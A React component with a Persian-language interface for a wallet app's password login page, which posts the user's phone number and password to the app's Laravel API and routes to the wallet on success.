import { useState } from 'react';
import { useLocation, useNavigate, useOutletContext } from 'react-router-dom';
import axios from 'axios';
import WarningsBox from '../components/warningbox';
import ThemeToggleButton from '../theme/ThemeToggleButton';
import {
  Box,
  Button,
  TextField,
  Typography,
  Container,
  Grid,
  Modal,
  Backdrop,
  Fade,
} from '@mui/material';

const Password = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { darkMode, toggleDarkMode } = useOutletContext();

  const phone = location.state?.phone;
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [errorModal, setErrorModal] = useState({
    open: false,
    message: ''
  });

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!password.trim()) {
      setErrorModal({
        open: true,
        message: 'رمز عبور نمی‌تواند خالی باشد.'
      });
      return;
    }

    setLoading(true);
      try {
      const response = await axios.post(
        'https://amirrezaei2002x.shop/laravel/api/check-password',
        { mobile_number: phone, password: password.trim() },
        {
          headers: { 'Content-Type': 'application/json' },
        }
      );

      // اگر status 2xx باشد، یعنی وارد بلاک try شده‌ایم
      if (response.data && response.data.success === true) {
        navigate('/wallet');
      } else {
        // اگر سرور با 2xx آمد اما success=false باشد
        setErrorModal({
          open: true,
          message: response.data?.message || 'رمز عبور نادرست است.',
        });
      }
    } catch (error) {
      // اگر Axios خطا بدهد (مثلاً status 401 یا 400 برای رمز اشتباه):
      if (error.response) {
        // پاسخ از سرور آمده ولی status غیر از 2xx است
        const serverMsg = error.response.data?.message;
        setErrorModal({
          open: true,
          message: serverMsg || 'رمز عبور نادرست است.',
        });
      } else {
        // خطای شبکه یا قطع ارتباط
        setErrorModal({
          open: true,
          message: 'ارتباط با سرور برقرار نشد. لطفاً دوباره تلاش کنید.',
        });
      }
    } finally {
      setLoading(false);
    }
  };

  const closeErrorModal = () => {
    setErrorModal(prev => ({ ...prev, open: false }));
  };

  return (
    <Container fullWidth sx={{ height: '100vh', display: 'flex', p: '0 !important', m: '0 !important' }}>
      {/* مودال خطا */}
      <Modal
        open={errorModal.open}
        onClose={closeErrorModal}
        closeAfterTransition
        slots={{ backdrop: Backdrop }}
        slotProps={{ backdrop: { timeout: 500 } }}
      >
        <Fade in={errorModal.open}>
          <Box
            sx={{
              position: 'absolute',
              top: '50%',
              left: '50%',
              transform: 'translate(-50%, -50%)',
              width: 300,
              bgcolor: (theme) => theme.palette.background.default,
              border: '2px solid #000',
              boxShadow: 24,
              p: 4,
              textAlign: 'center',
              borderRadius: 2,
            }}
          >
            <Typography variant="h6" component="h2" gutterBottom>
              خطا
            </Typography>
            <Typography sx={{ mt: 2, mb: 3 }}>
              {errorModal.message}
            </Typography>
            <Button variant="contained" onClick={closeErrorModal} sx={{ width: '100%' }}>
              فهمیدم
            </Button>
          </Box>
        </Fade>
      </Modal>

      <Grid container sx={{
        flex: 1,
        m: 0,
        display: 'flex',
        flexDirection: { xs: 'column-reverse', md: 'row' },
      }}>
        <Grid item size={{xs:12,md:6}} sx={{ p: 0, m: 0 }}>
          <WarningsBox />
        </Grid>

        <Grid item size={{xs:12, md:6}} sx={{
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          p: { xs: 2, md: 5 },
        }}>
          <Box width="100%" maxWidth={600}>
            <Box my={1} sx={{ textAlign: 'right' }}>
              <ThemeToggleButton darkMode={darkMode} toggleDarkMode={toggleDarkMode} />
            </Box>

            <Typography variant="h5" fontWeight="bold" gutterBottom>
              وارد کردن رمز عبور
            </Typography>

            <Typography variant="body1" color="textSecondary" sx={{ mb: 3 }}>
                رمز عبور خود را وارد کنید یا درصورت فراموشی از رمز یکبار مصرف استفاده کنید
            </Typography>

            <Button
              onClick={() => navigate('/Sms_verification')}
              startIcon={<i className="fas fa-chevron-left" />}
              sx={{
                p: 0,
                mb: 3,
                justifyContent: 'flex-start',
                color: 'primary.main',
                '&:hover': { backgroundColor: 'transparent' }
              }}
            >
              ورود با رمز یکبار مصرف
            </Button>

            <form onSubmit={handleSubmit}>
              <TextField
                fullWidth
                label="رمز عبور"
                type="password"
                variant="outlined"
                placeholder="مثال: 123456"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                sx={{ mb: 3 }}
              />

              <Button
                type="submit"
                variant="contained"
                fullWidth
                disabled={loading}
                sx={{
                  height: 60,
                  fontSize: '1.1rem',
                  borderRadius: 0
                }}
              >
                {loading ? 'در حال بررسی...' : 'ورود'}
              </Button>
            </form>
          </Box>
        </Grid>
      </Grid>
    </Container>
  );
};

export default Password;
